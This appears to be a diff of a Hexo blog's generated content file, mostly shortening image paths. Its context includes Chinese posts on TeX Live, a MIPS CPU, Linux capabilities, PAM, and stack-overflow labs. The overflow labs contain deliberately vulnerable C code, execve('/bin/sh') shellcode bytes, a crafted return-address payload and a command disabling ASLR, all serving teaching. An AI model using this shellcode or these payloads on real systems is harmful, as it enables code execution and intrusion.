@@ -18,6 +18,8 @@
 <h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
 
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+<p>image test</p>
+<p><img src="test.png" alt="image"></p>
 ]]></content>
   </entry>
   <entry>
@@ -39,9 +41,9 @@
 </ol>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo apt install perl-tk</span><br><span class="line">$ .&#x2F;install-tl -gui&#x3D;perltk</span><br></pre></td></tr></table></figure>
 
-<p><img src="ubuntu%E6%90%AD%E5%BB%BATexLive%E7%8E%AF%E5%A2%83%E5%86%99slide/install-lnx-main.png" alt="install-lnx-main"></p>
+<p><img src="install-lnx-main.png" alt="install-lnx-main"></p>
 <p><code>Installation collections --&gt; change</code> 选择安装模块，去除一些用不着的语言<code>Cyrillic</code> 至<code>Spanish</code> ，选上<code>US and UK English</code> ：</p>
-<p><img src="ubuntu%E6%90%AD%E5%BB%BATexLive%E7%8E%AF%E5%A2%83%E5%86%99slide/stdcoll.png" alt="stdcoll"></p>
+<p><img src="stdcoll.png" alt="stdcoll"></p>
 <p><code>TEXDIR --&gt;change</code> 修改为安装路径：<code>/media/xsyin/extra/texlive2018</code> ，其余默认，开始安装。</p>
 <ol start="3">
 <li>配置环境变量，编辑<code>~/.bashrc</code>， 添加：</li>
@@ -104,14 +106,14 @@
 <li><code>NX</code>:开启NX保护后，程序的堆栈将会不可执行，对应GCC编译选项<code>-z execstack</code>解除该保护。</li>
 </ul>
 <p>C语言栈帧结构如下：</p>
-<p><img src="%E6%A0%88%E6%BA%A2%E5%87%BA/c.jpg" alt="c"></p>
+<p><img src="c.jpg" alt="c"></p>
 <h3 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">FILE* g_fp; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_file</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> v,length=<span class="number">0</span>;           </span><br><span class="line">    g_fp=fopen(<span class="string">"../input/buffer_overflow_code_injection_write_file.txt"</span>,<span class="string">"r"</span>); </span><br><span class="line">    <span class="keyword">if</span>(g_fp==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"open file failed!\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(g_fp, <span class="string">"\\x%02x"</span>, &amp;v) == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[length++] = v;</span><br><span class="line">    &#125; </span><br><span class="line">    fclose(g_fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    read_file(); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
 <li>分析漏洞代码， while循环出现栈溢出，读入文件中覆盖了rbp与返回地址，且修改其指向shellcode起始指令；</li>
 <li>分析读入文件，即将返回地址处修改为shellcode首地址</li>
 </ul>
-<p><img src="%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_037.png" alt="选区_037"></p>
+<p><img src="%E9%80%89%E5%8C%BA_037.png" alt="选区_037"></p>
 <ul>
 <li>编译：</li>
 </ul>
@@ -120,21 +122,21 @@
 <h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><ul>
 <li>使用gdb调试运行：<code>gdb buffer_overflow</code></li>
 </ul>
-<p><img src="%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_038.png" alt="选区_038"></p>
+<p><img src="%E9%80%89%E5%8C%BA_038.png" alt="选区_038"></p>
 <p>​       由调试可知栈帧结构如图所示，因此栈溢出时会覆盖<code>length</code>值，即100后有覆盖为97,最终读入0x6d即109，刚好从rbp指向地址开始填充之后的8个0x61，之后填充返回地址，由图中分析可知该返回地址应改为<code>0x00007fffffffdab0</code>，小端模式，读入文件中\x20\x18改为\xb0\xda。重新调试：</p>
-<p><img src="%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_039.png" alt="选区_039"></p>
+<p><img src="%E9%80%89%E5%8C%BA_039.png" alt="选区_039"></p>
 <p>成功跳入shellcode，继续运行：</p>
-<p><img src="%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_040.png" alt="选区_040"></p>
+<p><img src="%E9%80%89%E5%8C%BA_040.png" alt="选区_040"></p>
 <p>正常退出，此时output文件夹已生成新文件：</p>
-<p><img src="%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_041.png" alt="选区_041"></p>
+<p><img src="%E9%80%89%E5%8C%BA_041.png" alt="选区_041"></p>
 <p>在gdb调试环境下运行成功，但实际运行却出现段错误：</p>
-<p><img src="%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_042.png" alt="选区_042"></p>
+<p><img src="%E9%80%89%E5%8C%BA_042.png" alt="选区_042"></p>
 <h3 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h3><p>​        经搜索查阅资料得知是gdb有自己的变量环境，变量的存放地址和程序实际运行会不一致，因此只需要把返回地址改为shellcode实际存放的地址即可，填充长度无须改变，因为相对偏移不变。</p>
 <p> 要获取shellcode首条指令的地址，可以在程序中打印出length的地址加上4(length)+8(rbp)+8(返回地址)=20,也可以利用内核转储获取真实地址。</p>
 <p> 首先启用内核转储：ulimit -c unlimited，缺省情况下，内核在coredump时所产生的core文件放在与该程序相同的目录中，并且文件名固定为core。</p>
-<p><img src="%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_045.png" alt="选区_045"></p>
+<p><img src="%E9%80%89%E5%8C%BA_045.png" alt="选区_045"></p>
 <p>由图中可知应把读入文件返回地址处改为：<code>\x40\xdb\xff\xff\xff\x7f\x00\x00</code>，再次运行：</p>
-<p><img src="%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_046.png" alt="选区_046"></p>
+<p><img src="%E9%80%89%E5%8C%BA_046.png" alt="选区_046"></p>
 <p>正常环境下运行成功。</p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>复现关键点：</p>
 <ul>
@@ -249,10 +251,10 @@
 
 </li>
 </ul>
-<h2 id="2-设计总体要求"><a href="#2-设计总体要求" class="headerlink" title="2.设计总体要求"></a>2.设计总体要求</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="(1)概述"></a>(1)概述</h3><p>单周期（Single Cycle）CPU是指CPU从取出1条指令到执行完该指令只需1个时钟周期。<br><img src="MIPS-CPU%E5%8D%95%E5%91%A8%E6%9C%9F%E8%AE%BE%E8%AE%A1/1-3-1.png" alt=""><br>一条指令的执行过程包括：取指令→分析指令→执行指令→保存结果（如果有的话）。对于单周期CPU来说，这些执行步骤均在一个时钟周期内完成。</p>
-<h3 id="2-设计实现电路"><a href="#2-设计实现电路" class="headerlink" title="(2)设计实现电路"></a>(2)设计实现电路</h3><p><img src="MIPS-CPU%E5%8D%95%E5%91%A8%E6%9C%9F%E8%AE%BE%E8%AE%A1/cpu.png" alt=""></p>
+<h2 id="2-设计总体要求"><a href="#2-设计总体要求" class="headerlink" title="2.设计总体要求"></a>2.设计总体要求</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="(1)概述"></a>(1)概述</h3><p>单周期（Single Cycle）CPU是指CPU从取出1条指令到执行完该指令只需1个时钟周期。<br><img src="1-3-1.png" alt=""><br>一条指令的执行过程包括：取指令→分析指令→执行指令→保存结果（如果有的话）。对于单周期CPU来说，这些执行步骤均在一个时钟周期内完成。</p>
+<h3 id="2-设计实现电路"><a href="#2-设计实现电路" class="headerlink" title="(2)设计实现电路"></a>(2)设计实现电路</h3><p><img src="cpu.png" alt=""></p>
 <h3 id="3-实现指令集"><a href="#3-实现指令集" class="headerlink" title="(3)实现指令集"></a>(3)实现指令集</h3><p>MIPS指令系统结构有MIPS-32和MIPS-64两种。本实验的MIPS指令选用MIPS-32。以下所说的MIPS指令均指MIPS-32。<br>MIPS的指令格式为32位。图3-3给出了MIPS指令的3种格式。</p>
-<p><img src="MIPS-CPU%E5%8D%95%E5%91%A8%E6%9C%9F%E8%AE%BE%E8%AE%A1/1-3-3.png" alt=""><br>本实验只选取了18条典型的MIPS指令来描述CPU逻辑电路的设计方法。表3-1列出了本实验的所涉及到的18条MIPS指令。<br><img src="MIPS-CPU%E5%8D%95%E5%91%A8%E6%9C%9F%E8%AE%BE%E8%AE%A1/1-t-1.png" alt=""><br>Op和Op2为操作码；<br>shift保存要移位的位数；<br>rd、rs、rt分别为寄存器的寄存器号；<br>immediate保存立即数的低16位；<br>offset为偏移量；<br>address为转移地址的一部分。  </p>
+<p><img src="1-3-3.png" alt=""><br>本实验只选取了18条典型的MIPS指令来描述CPU逻辑电路的设计方法。表3-1列出了本实验的所涉及到的18条MIPS指令。<br><img src="1-t-1.png" alt=""><br>Op和Op2为操作码；<br>shift保存要移位的位数；<br>rd、rs、rt分别为寄存器的寄存器号；<br>immediate保存立即数的低16位；<br>offset为偏移量；<br>address为转移地址的一部分。  </p>
 <p>1、对于add/sub/mul/and/or/xor  rd,rs,rt指令  //rdrs  op  rt<br>其中rs和rt是两个源操作数的寄存器号，rd是目的寄存器号。</p>
 <p>2、对于sll/srl/sra  rd,rt,shift 指令  //rdrt  移动  shift位</p>
 <p>3、对于addi/muli  rt,rs,imm 指令  //rtrs+imm(符号拓展)<br>rt是目的寄存器号，立即数要做符号拓展到32位。</p>
@@ -287,7 +289,7 @@
 <a id="more"></a>
 
 <h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>​      <code>C</code> 栈帧结构如下：</p>
-<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_025.png" alt="区_02"></p>
+<p><img src="%E9%80%89%E5%8C%BA_025.png" alt="区_02"></p>
 <p>​         因此当当前帧的局部变量和临时变量超出区域，覆盖了<code>ebp</code> 和返回地址时，就实现了栈溢出攻击。再通过精心设计返回地址，使其为<code>Shellcode</code> 的起始地址，就完成了运行流的劫持。</p>
 <p>​      实例基于 64位 <code>Ubuntu \ 16.04</code> 操作系统版本以及 <code>gcc,gdb</code> 版本信息如下：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Linux ubuntu 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br><span class="line"></span><br><span class="line">gcc (Ubuntu 5.4.0-6ubuntu1~16.04.9) 5.4.0 20160609</span><br><span class="line"></span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br></pre></td></tr></table></figure>
@@ -299,9 +301,9 @@
 <p>​       编写<code>Shellcode</code> ，该<code>shellcode</code> 调用<code>execve(&quot;/bin/sh&quot;,NULL)</code> ，启动一个新的<code>shell</code>，验证其功能，参考: <a href="https://www.exploit-db.com/exploits/36858/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/36858/</a> ，编写汇编文件如下：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    # char *const argv[]</span><br><span class="line">    xorl %esi, %esi</span><br><span class="line"> </span><br><span class="line">    # &#39;h&#39; &#39;s&#39; &#39;&#x2F;&#39; &#39;&#x2F;&#39; &#39;n&#39; &#39;i&#39; &#39;b&#39; &#39;&#x2F;&#39;</span><br><span class="line">    movq &#96;0x68732f2f6e69622f, %rbx</span><br><span class="line"> </span><br><span class="line">    # for &#39;\x00&#39;</span><br><span class="line">    pushq %rsi</span><br><span class="line">    pushq %rbx</span><br><span class="line">    pushq %rsp</span><br><span class="line">    </span><br><span class="line">    # const char *filename</span><br><span class="line">    popq %rdi</span><br><span class="line"> </span><br><span class="line">    # __NR_execve 59</span><br><span class="line">    pushq &#96;59</span><br><span class="line">    popq %rax</span><br><span class="line"> </span><br><span class="line">    # char *const envp[]</span><br><span class="line">    xorl %edx, %edx</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
 
-<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_028.png" alt="区_02"></p>
+<p><img src="%E9%80%89%E5%8C%BA_028.png" alt="区_02"></p>
 <p>   提取机器码：</p>
-<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_029.png" alt="区_02"></p>
+<p><img src="%E9%80%89%E5%8C%BA_029.png" alt="区_02"></p>
 <ul>
 <li>漏洞代码</li>
 </ul>
@@ -309,9 +311,10 @@
 
 <p>​       上面这段程序栈溢出漏洞触发点在<code>strcpy</code>函数, 函数没有做边界检查，可导致栈溢出覆盖返回地址。成功利用栈溢出需要确定覆盖多少个字节可以覆盖到返回地址。因此在<code>gdb</code>调试时确定<code>shellcode</code>的地址即<code>str</code>复制后<code>buf</code>的首地址，让返回地址指向该地址。</p>
 <ul>
-<li>结果</li>
+<li><p>结果</p>
+<p>为了更简单的方式实现栈溢出，需要关闭一些保护措施。</p>
+</li>
 </ul>
-<p>​  为了更简单的方式实现栈溢出，需要关闭一些保护措施。</p>
 <ul>
 <li><p><code>ASLR</code> (地址空间布局随机化)</p>
 <p>关闭<code>ASLR</code>：<code>echo 0 |sudo tee /proc/sys/kernel/randomize_va_space</code></p>
@@ -323,19 +326,19 @@
 </li>
 </ul>
 <p>编译调试：</p>
-<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_031.png" alt="区_03"></p>
+<p><img src="%E9%80%89%E5%8C%BA_031.png" alt="区_03"></p>
 <p>​       从调试结果可知，<code>buf</code> 的首地址为 <code>0x7fffffffdaa0</code> ，且查看内存该地址处确实为 <code>Shellcode</code> 起始代码。为了覆盖到返回地址，即填充字节至且包括8字节<code>rbp</code> (<code>0x7fffffffdac0</code>) ，则除了<code>shellcode</code>外还需要填充17字节。另外返回地址为<code>0x7fffffffdaa0</code>,改为小端模式<code>\xa0\xda\xff\xff\xff\x7f</code>。因此：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> str[<span class="number">60</span>]=<span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"</span></span><br><span class="line">              <span class="string">"\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line">              <span class="string">"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"</span></span><br><span class="line">              <span class="string">"\xa0\xda\xff\xff\xff\x7f\x00\x00"</span>;</span><br></pre></td></tr></table></figure>
 
 <p>​     重新编译，gdb调试运行：</p>
-<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_032.png" alt="区_03"></p>
+<p><img src="%E9%80%89%E5%8C%BA_032.png" alt="区_03"></p>
 <p> 成功运行。然而实际运行却是段错误，原因是gdb有自己的变量环境，变量的存放地址和程序实际运行会不一致，因此只需要把返回地址改为shellcode实际存放的地址即可，填充长度无须改变，因为相对偏移不变。</p>
 <p>获取<code>shellcode</code> 实际地址，可以打印出<code>buf</code> 地址，也可以利用内核转储获取真实地址。首先启用内核转储 <code>ulimit -c unlimited</code>  ，缺省情况下，内核在coredump时所产生的core文件放在与该程序相同的目录中，并且文件名固定为core。</p>
-<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_033.png" alt="区_03"></p>
+<p><img src="%E9%80%89%E5%8C%BA_033.png" alt="区_03"></p>
 <p>因此修改<code>str</code> 尾部为<code>\x10\xdb\xff\xff\xff\x7f\x00\x00</code>。重新编译运行：</p>
-<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_034.png" alt="区_03"></p>
+<p><img src="%E9%80%89%E5%8C%BA_034.png" alt="区_03"></p>
 <p>若启用保护措施，正常编译：</p>
-<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_035.png" alt="区_03"></p>
+<p><img src="%E9%80%89%E5%8C%BA_035.png" alt="区_03"></p>
 ]]></content>
       <categories>
         <category>安全</category>
@@ -353,11 +356,11 @@
 <p>以<code>ping</code> 命令为例，删除<code>s</code> 位后无法<code>ping</code> ，因为没有打开<code>socket</code> 的权限。而当将<code>s</code> 位重新设置时，又可以<code>ping</code>  ：</p>
 <a id="more"></a>
 
-<p><img src="Linux-%E6%9D%83%E8%83%BD%E6%9C%BA%E5%88%B6/setuid-ping.png" alt="选区_047"></p>
+<p><img src="setuid-ping.png" alt="选区_047"></p>
 <p>为了执行权限检查，传统的 UNIX 实现区分两种类型的进程：特权进程（其有效用户 ID 为0，称为超级用户或 root），和非特权用户（其有效 UID 非0）。特权进程绕过所有的内核权限检查，而非特权进程受基于进程的认证信息（通常是：有效 UID，有效 GID，和补充组列表）的完整权限检查的支配。</p>
 <p>自内核 2.2 版本开始，Linux 将传统上与超级用户关联的特权分为几个单元，称为 capabilities （权能），它们可以被独立的启用或禁用。权能是每个线程的属性。权能相当于规范了你这个程序所拥有的权限。相当于特权的需求的细化。当执行特权操作的时候，可以查看是否有相应的权能。</p>
 <p><code>ping</code> 命令需要<code>CAP_NET_RAW</code>的权能，使用<code>setcap</code>为其添加权能：</p>
-<p><img src="Linux-%E6%9D%83%E8%83%BD%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_051.png" alt="选区_050"></p>
+<p><img src="%E9%80%89%E5%8C%BA_051.png" alt="选区_050"></p>
 <p>可以<code>ping</code> ，且没有设置<code>uid</code> 位。</p>
 </li>
 <li><p>使用<code>man capabilities</code>  可以查看权能列表及相应的解释：</p>
@@ -553,8 +556,8 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm &#x2F;u&#x3D;s</span><br><span class="line">find &#x2F; -perm -4000</span><br></pre></td></tr></table></figure>
 
 <p>结果如下：</p>
-<p><img src="Linux-%E6%9D%83%E8%83%BD%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_048.png" alt="选区_048"></p>
-<p><img src="Linux-%E6%9D%83%E8%83%BD%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_049.png" alt="选区_049"></p>
+<p><img src="%E9%80%89%E5%8C%BA_048.png" alt="选区_048"></p>
+<p><img src="%E9%80%89%E5%8C%BA_049.png" alt="选区_049"></p>
 <p>部分需要的权能如下：</p>
 <table>
 <thead>
@@ -627,7 +630,7 @@
 
 <p>程序测试：</p>
 <p>测试环境：</p>
-<p><img src="Linux-%E6%9D%83%E8%83%BD%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_052.png" alt="选区_052"></p>
+<p><img src="%E9%80%89%E5%8C%BA_052.png" alt="选区_052"></p>
 <p>运行程序前：<code>sudo setcap cap_net_raw+eip /bin/ping</code>  保证文件有<code>eip</code> 权能</p>
 <ul>
 <li>sudo apt install libcap-dev</li>
@@ -637,13 +640,13 @@
 <li>sudo ./cap</li>
 </ul>
 <p>一开始可以<code>ping</code> :</p>
-<p><img src="Linux-%E6%9D%83%E8%83%BD%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_053.png" alt="选区_053"></p>
+<p><img src="%E9%80%89%E5%8C%BA_053.png" alt="选区_053"></p>
 <p>暂时性删除权能后无法<code>ping</code> :</p>
-<p><img src="Linux-%E6%9D%83%E8%83%BD%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_054.png" alt="选区_054"></p>
+<p><img src="%E9%80%89%E5%8C%BA_054.png" alt="选区_054"></p>
 <p>恢复后可以<code>ping</code>  :</p>
-<p><img src="Linux-%E6%9D%83%E8%83%BD%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_055.png" alt="选区_055"></p>
+<p><img src="%E9%80%89%E5%8C%BA_055.png" alt="选区_055"></p>
 <p>永久删除后无法<code>ping</code> :</p>
-<p><img src="Linux-%E6%9D%83%E8%83%BD%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_056.png" alt="选区_056"></p>
+<p><img src="%E9%80%89%E5%8C%BA_056.png" alt="选区_056"></p>
 <blockquote>
 <p>参考资料：</p>
 <p><a href="https://www.hrwhisper.me/introduction-to-linux-capability/#comments" target="_blank" rel="noopener">Linux setuid与权能介绍</a></p>
@@ -872,7 +875,7 @@
 <hr>
 <h3 id="基于PAM用户权限设置系统"><a href="#基于PAM用户权限设置系统" class="headerlink" title="基于PAM用户权限设置系统"></a>基于PAM用户权限设置系统</h3><p>PAM 的全称为“可插拔认证模块（Pluggable Authentication Modules）”。设计的初衷是将不同的底层认证机制集中到一个高层次的API中，从而省去开发人员自己去设计和实现各种繁杂的认证机制的麻烦。</p>
 <p>PAM认证一般遵循这样的顺序：Service(服务)→PAM(配置文件)→pam_*.so，PAM配置文件在<code>/etc/pam.d/</code> 目录下，原理图如下：</p>
-<p><img src="Linux%E6%9D%83%E8%83%BD%E4%B8%8EPAM%E6%9C%BA%E5%88%B6/pam.png" alt="pam"></p>
+<p><img src="pam.png" alt="pam"></p>
 <p>PAM中配置字段：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">moudle_type  control_flag  moudle_path moudle_option&#x2F;moudle_args</span><br></pre></td></tr></table></figure>
 
@@ -940,7 +943,7 @@
 </tbody></table>
 <p>​        Example：auth [user_unknown=ignore success=ok ignore=ignore default=bad] pam_securetty.so</p>
 <ol start="3">
-<li><code>module_path</code> 将指定实现模块的库对象的路径名称。默认情况下，它将被设为 <code>/lib/security</code>。        <img src="Linux%E6%9D%83%E8%83%BD%E4%B8%8EPAM%E6%9C%BA%E5%88%B6/libpam.png" alt="libpam"></li>
+<li><code>module_path</code> 将指定实现模块的库对象的路径名称。默认情况下，它将被设为 <code>/lib/security</code>。        <img src="libpam.png" alt="libpam"></li>
 <li>module_options/module_args（可选字段）将指定可以传递给服务模块的选项或实参。</li>
 </ol>
 <hr>
@@ -949,7 +952,7 @@
 <li>添加用户<code>userping</code>  :  <code>sudo adduser userping</code> </li>
 <li>查看并清除<code>/bin/ping</code> 的权能：</li>
 </ul>
-<p><img src="Linux%E6%9D%83%E8%83%BD%E4%B8%8EPAM%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_057.png" alt="选区_057"></p>
+<p><img src="%E9%80%89%E5%8C%BA_057.png" alt="选区_057"></p>
 <ul>
 <li>切换到用户<code>userping</code> 再<code>ping</code> 无法<code>ping</code>   : <code>su userping</code> </li>
 <li><code>userping</code> 登录时给<code>/bin/ping</code> 添加权能：</li>
@@ -964,7 +967,7 @@
 <ul>
 <li>所有登录都使用<code>common-session</code> 模块：</li>
 </ul>
-<p><img src="Linux%E6%9D%83%E8%83%BD%E4%B8%8EPAM%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_058.png" alt="选区_058"></p>
+<p><img src="%E9%80%89%E5%8C%BA_058.png" alt="选区_058"></p>
 <p>因此在<code>common-session</code> 模块中添加规则: </p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">session  optional  pam_exec.so debug log&#x3D;&#x2F;tmp&#x2F;pam_exec.log seteuid &#x2F;usr&#x2F;local&#x2F;bin&#x2F;ping_cap.sh</span><br></pre></td></tr></table></figure>
 
@@ -972,9 +975,9 @@
 <ul>
 <li>切换到<code>userping</code> 用户：</li>
 </ul>
-<p><img src="Linux%E6%9D%83%E8%83%BD%E4%B8%8EPAM%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_059.png" alt="选区_059"></p>
+<p><img src="%E9%80%89%E5%8C%BA_059.png" alt="选区_059"></p>
 <p>出错多次，最终调试成功：</p>
-<p><img src="Linux%E6%9D%83%E8%83%BD%E4%B8%8EPAM%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_061.png" alt="选区_060"></p>
+<p><img src="%E9%80%89%E5%8C%BA_061.png" alt="选区_060"></p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>优点：<code>userping</code> 用户无法执行特权命令，通过<code>pam</code> 可赋予一些特权操作。</p>
 <p>缺点：本实验中修改了<code>ping</code> 的文件权能，影响了其他用户。退出<code>userping</code> 后，<code>ping</code> 命令变成有效了。</p>
 <p>过渡C版本：</p>
